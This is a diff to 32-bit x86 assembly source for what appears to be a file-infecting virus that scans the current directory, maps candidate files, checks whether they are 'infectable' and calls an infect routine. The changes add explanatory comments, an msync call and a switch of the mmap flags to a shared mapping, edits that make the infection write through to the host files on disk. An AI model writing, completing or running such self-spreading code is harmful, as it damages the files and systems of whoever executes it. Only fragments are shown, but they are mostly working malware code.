@@ -7,23 +7,24 @@ main:
     # print the infect message
     mov $4, %eax
     mov $0, %ebx
-    pushl $0x000a7463
+    # push the string 'infect\0' onto the stack in hex in reverse order
+    pushl $0x000a7463 
     pushl $0x65666e69
+    # use stack pointer as string address to write
     mov %esp, %ecx
     mov $7, %edx
     int $0x80
 
     # open current directory for file scan
     mov $5, %eax
-    pushw $0x002e
+    pushw $0x002e  # hex encoded '.'
     mov %esp, %ebx
     xor %ecx, %ecx
     movb $2, %dl
     int $0x80
 
-    # space for local vars (24 on stack + 12)
-    # dirent, dirfd, diroff, hostfd, hostsz, 
-    # mmap addr, vstart, vend and vlen
+    # space on stack for local vars (24 on stack + 12)
+    # dirent, dirfd, diroff, hostfd, hostsz, mmap addr, vstart, vend and vlen
     sub $24, %esp
     # directory fd
     mov %eax, 4(%esp)
@@ -110,6 +111,7 @@ vend_addr:
     # with enough padding
     mov 32(%esp), %edi
     call isinfectable
+after_infectable:
     # padding offset
     cmp $0, %ebx
     je unmap
@@ -120,6 +122,13 @@ vend_addr:
     call infect
 
 unmap:
+    # msync
+    mov 20(%esp), %ebx  # addr
+    mov 16(%esp), %ecx  # len
+    mov $4, %edx
+    mov $144, %eax
+    int $0x80
+
     # file size
     mov 16(%esp), %ecx
     mov 20(%esp), %ebx
@@ -210,7 +219,7 @@ do_mmap:
     xor %ebx, %ebx
     sub $0x1, %ecx
     mov $0x3, %edx
-    mov $0x2, %esi
+    mov $0x1, %esi
     xor %ebp, %ebp
     int $0x80
     cmp $-1, %eax
